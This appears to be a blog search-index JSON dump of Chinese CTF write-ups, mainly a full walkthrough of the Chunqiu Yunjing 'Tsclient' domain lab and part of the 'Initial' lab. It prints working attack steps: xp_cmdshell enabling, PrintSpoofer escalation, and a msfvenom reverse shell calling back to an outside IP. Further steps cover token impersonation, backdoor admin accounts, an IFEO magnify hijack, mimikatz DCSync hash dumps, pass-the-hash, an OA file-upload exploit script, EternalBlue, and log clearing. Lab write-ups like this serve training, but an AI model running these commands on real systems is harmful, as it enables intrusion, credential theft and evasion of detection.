\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"},{"content":"Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient \u0026ndash; Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; 存在\n那我们接下来启动它\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; 配置选项 \u0026#39;xp_cmdshell\u0026#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u0026gt; IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u0026gt; [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u0026gt;net user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u0026gt;quser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 这台机子不出网，我们可以通过共享文件夹的方式来传文件\n这里我是用第一台机子(172.22.8.18)，将文件夹C:/xrntkk共享给(172.22.8.46)\n在46上Win+R并输入\n\\\\172.22.8.18 输入18共享文件的账号密码即可\n接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Tsclient-Writeup"},{"content":" 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u0026gt; output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u0026gt; screenshot # 捕获屏幕\rmeterpreter \u0026gt; upload hello.txt c:// #上传文件\rmeterpreter \u0026gt; download d://1.txt # 下载文件\rmeterpreter \u0026gt; shell # 获取cmd\rmeterpreter \u0026gt; clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 拿到最后一个flag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e菜鸡第一个通关的靶场Orz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscan扫一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用thinkphpgui写马连蚁剑\u003c/p\u003e\n\u003cp\u003e\u003cimg 